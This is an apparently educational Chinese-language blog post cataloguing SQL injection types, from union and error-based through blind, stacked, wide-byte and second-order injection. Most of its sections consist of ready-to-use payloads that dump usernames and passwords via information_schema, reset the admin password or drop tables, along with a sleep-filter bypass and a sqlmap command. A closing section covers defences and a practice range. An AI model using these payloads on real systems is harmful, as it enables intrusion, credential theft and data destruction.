---
title: "SQL注入类型"
published: 2026-05-20
updated: 2026-05-20
draft: false
description: "SQL注入的本质是用户输入被拼接进SQL语句并执行。攻击者通过控制输入来篡改原有SQL逻辑，实现越权查询、数据窃取甚至服务器控制。"
image: ""
tags:
  - SQL注入
category: 网络安全
pinned: false
comment: true
author: Ziddzide
---

<!-- AI: SQL注入-注入类型与利用 | Union/报错/布尔盲注/时间盲注/堆叠/二次/宽字节/search型 | 关键词: union select, information_schema, 报错注入, 盲注, 堆叠注入, 宽字节 -->

# SQL注入-注入类型与利用

## 原理

SQL注入的本质是**用户输入被拼接进SQL语句并执行**。攻击者通过控制输入来篡改原有SQL逻辑，实现越权查询、数据窃取甚至服务器控制。

核心条件：
1. 用户输入点可达SQL语句
2. 输入未经过滤或过滤不充分
3. 数据库支持执行恶意SQL

## 利用方式

### 一、联合注入 (Union Injection)

适用于页面有数据回显的场景。

**步骤：**
1. 判断闭合方式 → 2. 确定列数(`order by`) → 3. 确定回显位 → 4. 爆数据

```sql
-- 判断闭合（数字型 vs 字符型）
id=1 and 1=1       -- 数字型
id=1' and '1'='1   -- 单引号闭合
id=1" and "1"="1   -- 双引号闭合

-- 确定列数
1' order by 3--+   -- 递增测试, 报错说明超过列数

-- 确定回显位
-1' union select 1,2,3--+

-- 爆数据
-1' union select 1,database(),version()--+
-1' union select 1,table_name,3 from information_schema.tables where table_schema='dbname'--+
-1' union select 1,column_name,3 from information_schema.columns where table_name='users'--+
-1' union select 1,group_concat(username,0x3a,password),3 from users--+
```

### 二、报错注入 (Error-based Injection)

适用于无回显但报错信息可见的场景。

| 函数 | 数据库 | Payload示例 |
|------|--------|-------------|
| `updatexml` | MySQL | `and updatexml(1,concat(0x7e,(select database())),1)` |
| `extractvalue` | MySQL | `and extractvalue(1,concat(0x7e,(select user())))` |
| `floor+rand+group` | MySQL | `and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)` |
| `convert/cast` | SQL Server | `and 1=convert(int,@@version)` |
| `XMLType` | Oracle | `-` |
| `xmlserialize` | PostgreSQL | `and 1=(select xmlserialize(content version() as varchar(100)))` |

**updatexml 完整利用链：**
```sql
-- 当前库: and updatexml(1,concat(0x7e,database()),1)
-- 表名: and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='db' limit 0,1)),1)
-- 限制: 每次最多回显32字符, 需多次请求
```

### 三、布尔盲注 (Boolean Blind)

适用于完全无回显、但页面状态有差异（正确/错误）的场景。

```sql
-- 逐字符猜解
and ascii(substr((select database()),1,1))>100
and ascii(substr((select database()),1,1))=100

-- 猜表名
and (select count(*) from information_schema.tables where table_schema='db' and table_name like 'a%')>0

-- 猜列名
and (select count(*) from information_schema.columns where table_name='users' and column_name like 'a%')>0

-- 猜数据
and ascii(substr((select group_concat(username) from users),1,1))>100
```

**常用截取函数：** `substr()` / `left()` / `right()` / `mid()` / `substring()`

### 四、时间盲注 (Time Blind)

适用于页面状态无差异、无报错的场景，通过时间延迟判断条件真假。

| 数据库 | 延时函数 |
|--------|----------|
| MySQL | `sleep(5)` / `benchmark(10000000,md5(1))` |
| SQL Server | `waitfor delay '0:0:5'` |
| PostgreSQL | `pg_sleep(5)` |
| Oracle | `dbms_lock.sleep(5)` |

```sql
-- MySQL时间盲注
and if(ascii(substr((select database()),1,1))>100,sleep(5),0)
and case when ascii(mid(database() from 1 for 1))>100 then sleep(5) else 0 end

-- 用benchmark代替sleep（绕过sleep过滤）
and if(ascii(substr(database(),1,1))>100,benchmark(10000000,md5(1)),0)
```

### 五、堆叠注入 (Stacked Query)

条件：数据库接口支持多语句（`mysqli_multi_query()`或类似）。

```sql
id=1;insert into users values('hack','pass')--+
id=1;update users set password='123' where username='admin'--+
id=1;drop table test--+
```

### 六、搜索型注入

```sql
-- 原始SQL: select * from news where title like '%$keyword%'
-- 闭合需要处理 % 通配符
%' union select 1,2,3--+
%' union select 1,2,3 where '%'='%
```

### 七、宽字节注入

条件：数据库使用GBK/GB2312字符集 + 后端addslashes转义。

```sql
-- addslashes转义: ' → \'  (0x5c27)
-- 在GBK下 %df + 0x5c = 運 (一个汉字), 后面 ' 逃逸
%df' or 1=1--+
%df' union select 1,2,3--+
```

### 八、Base64编码注入

条件：应用对参数先base64解码再拼入SQL。

```plain
原始: 1' union select 1,2,3--+
编码: MScgdW5pb24gc2VsZWN0IDEsMiwzLS0r
```

### 九、二次注入

第一次请求将恶意数据存入数据库（被转义/过滤的处理入库），第二次请求从数据库读取时不再转义直接拼入SQL触发。

---

## 防御方案

1. **参数化查询（预编译）**：`$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?")` 
2. **输入验证**：白名单限制输入类型/长度/格式
3. **最小权限**：数据库账户仅授予必要权限，禁用FILE/INTO OUTFILE
4. **关闭错误显示**：生产环境不输出数据库报错
5. **WAF**：部署应用层防火墙检测常见注入模式

## 真实案例

- 2019年某CMS union注入导致千万用户数据泄露
- sql-labs靶场全覆盖练习

## 相关工具

- sqlmap：自动化注入检测与利用 `sqlmap -u "url?id=1" --dbs`
- Burp Suite：手动注入分析
